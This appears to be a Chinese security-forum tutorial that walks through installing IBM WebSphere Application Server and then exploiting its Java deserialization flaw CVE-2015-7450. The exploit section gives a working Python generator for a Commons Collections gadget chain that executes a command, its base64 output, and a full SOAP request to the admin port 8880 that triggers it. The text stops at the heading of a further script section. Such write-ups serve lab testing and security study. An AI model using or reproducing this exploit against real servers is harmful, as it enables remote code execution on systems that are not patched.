WebSphere中间件总结
==============

WebSphere简介
-----------

WebSphere为SOA（面向服务架构）环境提供软件，以实现动态的、互联的业务流程，为所有业务情形提供高度有效的应用程序基础架构。WebSphere是IBM的应用程序和集成软件平台，包含所有必要的中间件基础架构（包括服务器、服务和工具），这些基础架构是创建、部署、运行和持续监视企业级Web应用程序和跨平台、跨产品的解决方案所必需的。与WAS6，WAS7相比较而言WAS8发生了很大的改变，其安装介质和以前截然不同；并且官网已经明确说明：版本1.7.4.7及更早版本已被1.8.x和1.9.x版本取代。所有1.8之前版本的用户应将其系统升级到上述版本之一。

WebSphere Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验。从基于开放标准的丰富的编程模型中进行选择，以便更好的协调项目需求与编程模型功能和开发人员技能。

### 指纹

Server：WebSphere Application Server/7.0

### 登录页面

<http://127.0.0.1:9060/ibm/console/logon.jsp>

<https://127.0.0.1:9043/ibm/console/logon.jsp>

WebSphere详细安装（Win）
------------------

### 下载WebSphere

```php
下载地址：

http://www-01.ibm.com/support/docview.wss?uid=swg27004980

https://www-01.ibm.com/support/docview.wss?uid=swg27025142#ibm-content
```

下载的时候需要注册下账号密码

注册完后进入，进入之后选择版本：

![1](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-303ac8c07e71d7141880875324af1bdd76322fb2.png)

需要 下载文件 进行连接下载：

![2](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e9ba37c7319eb9aa337d1cf641f7d0a0f155892.png)

需要JDK8的版本支撑

![3](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-867b958a7a97d36415b4a91c76425fbc214d404f.png)

![4](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1d1cef5be51be5a9547c852c78d997b4a0e742c1.png)

![5](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-08d166758d9e19e9b7c8123df3f45052245b927a.png)

注意，一定需要挂载V2等才可以下载

下载完成后解压

![6](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-714bd9ed46e1d302587e25e8c9ca466f682516a3.png)

### 安装WebSphere

双击install.exe

![7](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f2e8cbc828cef6b741de980d4f223e31084eaccf.png)

![8](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1dccc8c033d3cde5e3dff2d6bfd8e0a9571c20fb.png)

![9](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d1ecbed5f3857b715d65e79fc79e824847c900bc.png)

![10](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9337c0874ab3b2af0f58f5d6ec3562a790906bf0.png)

![11](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-951ff2b402b42802717f558ad6764cb6691dc998.png)

安装时需要下载东西，计算机要保持联网状态

### 下载WAS

直接去官网搜索

<http://www.ibm.com/en-us/homepage-a.html>

搜索

Websphere Application Server for Developers

![12](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2a4694f233b037076fa41ffdf6716f5a3052c683.png)

下载完成后，解压

![13](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4568e7f5febb06869762d46e4c31b15d6ab445e0.png)

三个压缩文件解压到同一个文件夹内

### 安装WAS

运行IBM

![14](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0a36ee6d937438bcd3cb348d998e3dd77c3a8052.png)

打开首选项

![15](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-97a77b7a59a118225097ec65dabab75317c94ea3.png)

选择添加存储库-浏览，选中之前下载解压的目录下的 .config 文件

![16](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d6370ac31dec0a113318714828962a90da11b525.png)

点击确定，回到首页，选择安装，在安装软件包处打上勾

![17](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2be13802a0f529062be0c212c0f9afe278e808ee.png)

一直选择默认下一步，然后点击安装

![18](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ea7fc63b7d64277fa4e76701673fd2a9bb70cf79.png)

上图为安装完成

### 添加Server

选择创建

![19](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1616835ff62f21f3016a7c8fda2bd6b264f4905e.png)

选择应用程序服务器

![20](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8fce6d18e1c2db0ae743eac51fa712a947416a4d.png)

选择高级概要文件创建

![21](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2f9e5d53231785ca72abd93b833e73e83b65f247.png)

默认下一步

![22](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b5ca943dc43d9262411370166830836ccf06f94f.png)

C:\\Program Files (x86)\\IBM\\WebSphere\\AppServer\\profiles\\AppSrv01

![23](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-186095685a93982b230da02b36bb81076747acd4.png)

这里要注意主机名的配置为本机计算机名称（保证能Ping通），在实际生产中配置服务器的IP地址

填写用户名密码

![24](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c31c927ebd9f09f4cf2f319a9822f7854ba263dc.png)

admin / 123456

默认下一步

![25](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e553614da035c8937aae5d27116c1135dfe081bf.png)

注意默认端口信息，但是保存一下，可能会用到

取消勾选

![26](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e46cfe8e4cdff275542104c25eb44841872d3c2c.png)

然后默认下一步知道创建完成

取消勾选，然后完成

![27](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-25f0a8f866b8d60f067b91fce1737d076ad08010.png)

至此成功创建AppSrv01应用服务器

![28](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-12ebd4b7598297d08ab8596f38f5475a5b7308d5.png)

概要文件配置完成

目录结构如下

![29](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-558016785eda7e5b971935fcf240e0f3114e42f9.png)

### 运行WAS

管理员模式运行cmd

cd C:\\Program Files (x86)\\IBM\\WebSphere\\AppServer\\bin

startServer -help

命令行进入概要文件目录下的bin目录，执行startServer -help 查看该命令对应的帮助（其他命令的用法也可通过同样的操作得到）可能要等一会才会显示

![30](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6df315aadd7b64246fc3f6b04ab6782bf7ababa8.png)

执行命令启动WAS

startServer server1 -profileName AppSrv01

![31](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3d9e920e8c8e70659835671d7b88298e7b237eb8.png)

表示WAS成功启动 （可通过stopServer+【服务名】命令来停止）

打开浏览器输入 <http://127.0.0.1:9060/ibm/console>

![32](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d025f57629b1c6a5419461b646768c7f5d1b1d05.png)

![33](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-16e191970bf864ca7f234ef61fe9c9af223c2a26.png)

​ 搭建完成

Docker详细安装WebSphere7版本
----------------------

查看docker环境中websphere7有哪些

docker search WebSphere7

![34](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-45e0e6b14e41a20e6cb031703d8947bb190d265c.png)

拉取环境

docker pull iscrosales/websphere7

![35](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-16bbf162315cad8d1154addca6620bd83f3ce66f.png)

需要10G空间左右

开启docker的websphere7

docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7

![36](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-23d40231641a8437e953f95d9db09d49c2872b36.png)

![39](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d593d8dfc180717d9ab33dd954d739c9508f1db3.png)

搭建完成

WebSphere渗透总结---
----------------

Java反序列化（CVE-2015-7450）
-----------------------

CVEID：CVE-2015-7450

说明：由于使用Java InvokerTransformer类对数据进行反序列化，Apache Commons COllections可能允许远程攻击者在系统上执行任意代码。通过发送特制数据，攻击者可以利用此漏洞在系统上执行任意Java代码

以下版本的WebSphere Application Server和IBM WebSphere Application Server Hypervisor Edition可能会受到影响

- 版本8.5和8.5.5传统和自由
- 8.0版
- 7.0版

### 漏洞验证

该反序列化漏洞发生的位置在SOAP的通信端口8880，使用https发送XML格式数据。如果访问8880端口出现如下界面，则可能存在Java反序列化漏洞

<http://127.0.0.1:8880/>

8.5版本：

![37](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ca965577dc42ae8f4425290d4e8ae7bb5b7ac2d4.png)

7.0版本：

![38](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1cf6ac3c0d33a2e139a742d5e66b736e6d129463.png)

#### 修改请求包的方式

通过访问发现xml的回显，回显内容将构造的执行命令的payload通过base64编码后放在objectname节点中，通过https发送到服务器端，服务器端调用相应的执行函数，将结果发送给客户端，同样返回的数据也是经过base64编码的

```php
import base64

from binascii import unhexlify

command = &quot;touch /tmp/yxc007&quot;

serObj = unhexlify(&quot;ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400&quot;)

serObj += (chr(len(command)) + command).encode('ascii')

serObj += unhexlify(&quot;740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A&quot;)

serObjB64 = base64.b64encode(serObj).decode()

print(serObjB64)
```

将以上命令一步一步在python3环境下执行

![40](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-62af8b066b51efd3e1587fa0711a0efef3a80032.png)

print（serObjB64） 输出内容如下

```php
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEXRvdWNoIC90bXAveXhjMDA3dAAEZXhlY3VxAH4AHgAAAAFxAH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAEHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo=
```

将输出的serObjB64，替换到如下数据包中的params节点，发送数据包即可执行

```php
POST / HTTP/1.1
Host: 127.0.0.1:8880
User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml
SOAPAction: urn:AdminService
Content-Length: 8886

&lt;?xml version='1.0' encoding='UTF-8'?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
&lt;SOAP-ENV:Header ns0:JMXConnectorContext=&quot;rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4&quot; xmlns:ns0=&quot;admin&quot; ns0:WASRemoteRuntimeVersion=&quot;8.5.5.7&quot; ns0:JMXMessageVersion=&quot;1.2.0&quot; ns0:JMXVersion=&quot;1.2.0&quot;&gt;&lt;/SOAP-ENV:Header&gt;
&lt;SOAP-ENV:Body&gt;
&lt;ns1:invoke xmlns:ns1=&quot;urn:AdminService&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
&lt;objectname xsi:type=&quot;ns1:javax.management.ObjectName&quot;&gt;rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==&lt;/objectname&gt;
&lt;operationname xsi:type=&quot;xsd:string&quot;&gt;getUnsavedChanges&lt;/operationname&gt;
&lt;params xsi:type=&quot;ns1:[Ljava.lang.Object;&quot;&gt;{**serObjB64**}&lt;/params&gt;
&lt;signature xsi:type=&quot;ns1:[Ljava.lang.String;&quot;&gt;rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=&lt;/signature&gt;
&lt;/ns1:invoke&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
```

![42](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-25de47b0bdd400fdc70f8b00c34c00513fe375d1.png)

![41](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8b1a34f99c2335a4e201e9b05e9cbe5a63f28baf.png)

首先将上面的请求包内容修改host后（不替换数据包中的params节点）直接发包，返回500，基本上都是存在反序列化

然后把执行结果覆盖到ser0bjB64处

![43](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b710b656e0f1ca47ef43c9d7de904abf6b002048.png)

返回包还是500，利用成功

然后去docker查看即可

```php
docker exec -ti sid bash
 ls /tmp
```

#### 使用python脚本

